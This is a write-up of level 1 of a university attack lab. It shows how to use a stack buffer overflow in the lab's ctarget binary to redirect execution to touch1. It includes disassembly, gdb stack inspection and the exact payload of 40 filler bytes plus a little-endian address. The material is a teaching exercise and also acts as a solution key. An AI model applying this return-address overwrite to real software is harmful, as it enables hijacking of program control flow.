### Level 1

Looking at the instructions for level 1, we can see that we need to control the
return value of `test` such that instead of executing the `printf` (which
indicates a failure), we want to jump to `touch1`:

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

First off, dump the disassembly so we can take a closer look:

```shell
$ objdump -M intel -d ctarget > dumper.asm
```

Now take a look at the output and find `touch1`:

```asm
00000000004017c0 <touch1>:
  4017c0:       48 83 ec 08             sub    rsp,0x8
  4017c4:       c7 05 0e 2d 20 00 01    mov    DWORD PTR [rip+0x202d0e],0x1        # 6044dc <vlevel>
  4017cb:       00 00 00
  4017ce:       bf c5 30 40 00          mov    edi,0x4030c5
  4017d3:       e8 e8 f4 ff ff          call   400cc0 <puts@plt>
  4017d8:       bf 01 00 00 00          mov    edi,0x1
  4017dd:       e8 ab 04 00 00          call   401c8d <validate>
  4017e2:       bf 00 00 00 00          mov    edi,0x0
  4017e7:       e8 54 f6 ff ff          call   400e40 <exit@plt>
```

We can see that the address of `touch1` is `0x4017c0`, so what we need to do
is cause a buffer overflow such that the saved rip in `test` is overwritten to
the value `0x4017c0`.

We are told that `Gets` does not check the size of the buffer to ensure that
the contents it is going to write will not overflow. We are also told the
`BUFFER_SIZE` is a compile-time constant indicating the size of the buffer to
which our input will be written. We can see it in use in `getbuf`:

```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

In order to figure out the size of `BUFFER_SIZE`, we can look at the beginning
of the disassembly of `getbuf`:

```asm
00000000004017a8 <getbuf>:
  4017a8:       48 83 ec 28             sub    rsp,0x28
  4017ac:       48 89 e7                mov    rdi,rsp
  4017af:       e8 8c 02 00 00          call   401a40 <Gets>
```

`0x28` is is being subtracted from `rsp` to make room for the local variables
(of which there are only one), and `0x28` is `40` in decimal. Therefore it
looks like our buffer size is 40 (which includes the final null byte to signal
the end of the buffer). To test that, we can send in 39 characters of
output and then 40 characters of output - 39 should be fine, 40 should cause an
error:

```shell
$ ./ctarget -q -i <(python -c "print 'A'*39")
Cookie: 0x59b997fa
No exploit.  Getbuf returned 0x1
Normal return

$ ./ctarget -q -i <(python -c "print 'A'*40")
Cookie: 0x59b997fa
Oops!: You executed an illegal instruction
Better luck next time
FAIL: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:FAIL:0xffffffff:ctarget:0:41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
```

(As a side note, using 40 characters actually drops us into the middle of
`touch3`.) Therefore it looks like we fill the buffer with 40 characters,
followed by our target address (in little endian, so `c0 17 40`).

To get a visual for what is happening on the stack, we can use `gdb` to inspect
the stack in `getbuf` after feeding in 40 A's and 4 B's:

```text
$ python -c 'print "A"*40 + "B"*4' > payload
$ gdb ctarget
$ gdb -q ctarget
(gdb) b *0x04017b4
Breakpoint 1 at 0x4017b4: file buf.c, line 16.
(gdb) run -q -i payload
Starting program: /tmp/bomb/target1/ctarget -q -i payload
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:16
16	buf.c: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0x5561dca8:
 rip = 0x4017b4 in getbuf (buf.c:16); saved rip = 0x42424242
 called by frame at 0x5561dcb0
 source language c.
 Arglist at 0x5561dc70, args:
 Locals at 0x5561dc70, Previous frame's sp is 0x5561dca8
 Saved registers:
  rip at 0x5561dca0
```

We can see that the return pointer (`saved rip`) has been overwritten with our
four B's. We can also take a look at the stack (starting at `rsp`) and see our
buffer:

```text
(gdb) x/12x 0x5561dc78
0x5561dc78:	0x41414141	0x41414141	0x41414141	0x41414141
0x5561dc88:	0x41414141	0x41414141	0x41414141	0x41414141
0x5561dc98:	0x41414141	0x41414141	0x42424242	0x00000000
```

Therefore all we need to do is provide the (little endian) address to `touch1`:

```text
$ ./ctarget -q -i <(python -c "print 'A'*40 + '\xc0\x17\x40'")
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 C0 17 40
```
